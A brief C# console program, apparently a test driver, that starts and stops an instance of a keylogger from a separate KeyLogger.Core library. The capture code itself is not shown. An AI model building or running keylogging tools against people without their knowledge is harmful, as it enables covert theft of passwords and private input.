using System;
using KeyLogger.Core;

namespace TestConsole
{
    class Program
    {
        static void Main(string[] args)
        {
            KeyLoggerInstance keyLogger = new KeyLoggerInstance(new KeyCheker(), new LogSaver(), 10, 10000);
            keyLogger.Start();
            Console.ReadLine();
            keyLogger.Stop();
        }
        
    }
}
